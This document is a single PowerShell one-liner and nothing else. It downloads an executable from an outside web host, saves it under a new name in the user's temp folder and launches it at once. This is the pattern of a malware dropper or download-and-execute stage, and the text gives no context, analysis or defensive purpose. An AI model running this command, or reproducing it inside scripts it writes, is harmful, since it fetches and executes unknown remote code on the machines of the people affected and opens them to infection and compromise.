
($deploylocation=$env:temp+'fleeb.exe');(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/miracle.exe', $deploylocation);Start-Process $deploylocation

